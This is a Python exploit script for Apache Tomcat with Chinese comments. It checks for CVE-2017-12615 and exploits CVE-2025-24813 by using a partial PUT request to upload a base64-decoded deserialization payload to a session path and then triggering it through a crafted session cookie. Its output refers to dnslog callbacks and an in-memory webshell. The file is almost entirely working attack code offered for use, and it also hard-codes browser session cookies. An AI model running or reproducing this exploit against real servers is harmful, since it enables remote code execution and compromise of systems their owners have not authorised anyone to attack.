import argparse
import base64
import secrets
import string
import requests

proxies = {
    "http":"http://127.0.0.1:8083",
    "https":"http://127.0.0.1:8083"
}

headers ={
    "Cookie": "BIDUPSID=0F33197772426E2FB6771A2DE0C095A6; PSTM=1728353643; BD_UPN=12314753; BAIDUID=300CD814A7405C9424A93CC7F20C1845:FG=1; H_WISE_SIDS_BFESS=60277; H_WISE_SIDS=60277_60854_60884_60875; ZFY=VpT3BYENRLwsXD14pX37J3ikuVGlraQI5P4P:AvHm4P4:C; BAIDUID_BFESS=300CD814A7405C9424A93CC7F20C1845:FG=1; BD_CK_SAM=1; PSINO=6; delPer=0; BA_HECTOR=a5802k812k0h8l0084a4a52g89kmg21jgviuo1v; BDORZ=FFFB88E999055A3F8A630C64834BD6D0; H_PS_PSSID=60277_60854_60884_60875_60897; BD_HOME=1",
    "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
    "Connection": "keep-alive",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "Windows",
    "Upgrade-Insecure-Requests": "1",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Accept-Language": "zh-CN,zh;q=0.9",
}

def generate_random_path():
    """生成包含8位随机字符的路径段"""
    chars = string.ascii_letters + string.digits
    return ''.join(secrets.choice(chars) for _ in range(8))

def CVE_2017_12615(url):        
     # 生成动态路径
    random_str = generate_random_path()
    full_path = url + f"/{random_str}.txt"
    body_data = "Hello"
   
    requests.put(url=full_path + "/", headers=headers, proxies=proxies)
    get_resp = requests.get(url=full_path, headers=headers, proxies=proxies)
    if body_data in get_resp.text:
        print("[+] Target : "+ url +" (Apache Tomcat CVE-2017-12615: 存在)")
        
    return True


def CVE_2025_24813(target, file = None):

    try:

        # 生成动态路径
        random_str = generate_random_path()
        full_path = target + f"/{random_str}/session"

        if file is None:
            put_resp = requests.put(url=full_path, headers=headers, proxies=proxies)
            if put_resp.status_code == 409:
                print("[+] Target : "+ target +" (Apache Tomcat CVE-2025-24813: 可能存在，请上传反序列化exp利用验证)")
            return
        # 读取并解码文件
        with open(file, 'r') as f:
            encoded_data = f.read().replace('\n', '')
        binary_data = base64.b64decode(encoded_data)

        headers["Content-Length"] = str(len(binary_data))
        headers["Content-Range"] = "bytes 0-" + str(len(binary_data)+5000) + "/" + str(len(binary_data)+5001) 

        put_resp = requests.put(url=full_path,data=binary_data, headers=headers, proxies=proxies)
        headers.pop("Content-Length", None) 
        headers.pop("Content-Range", None) 
        headers["Cookie"] = "JEESESSIONID=." + random_str
        requests.get(url=target, headers=headers, proxies=proxies)
        if put_resp.status_code == 409:
             print("[+] Target : "+ target +" (Apache Tomcat CVE-2025-24813: 反序列化文件上传并执行，请检测dnslog和内存马路径)")
        headers.pop("Cookie", None)

    except Exception as e:
        print(f"执行错误: {str(e)}")


def main():
    parser = argparse.ArgumentParser(description='Exploit script for Tomcat')
    parser.add_argument('-t', '--target', required=True,  help='目标URl')
    parser.add_argument('-f', '--file',  help='Base64编码反序列化内容(CVE_2025_24813)')
    parser.add_argument('-v', '--vul', required=True, help='单项选择漏洞(ALL,CVE_2017_12615,CVE_2025_24813)')
    
    args = parser.parse_args()
        
    if args.vul == "ALL":
        CVE_2017_12615(args.target)
        CVE_2025_24813(args.target)

    elif args.vul == "CVE_2017_12615":
        CVE_2017_12615(args.target)
    elif args.vul == "CVE_2025_24813":
        CVE_2025_24813(args.target, args.file)


if __name__ == "__main__":
    main()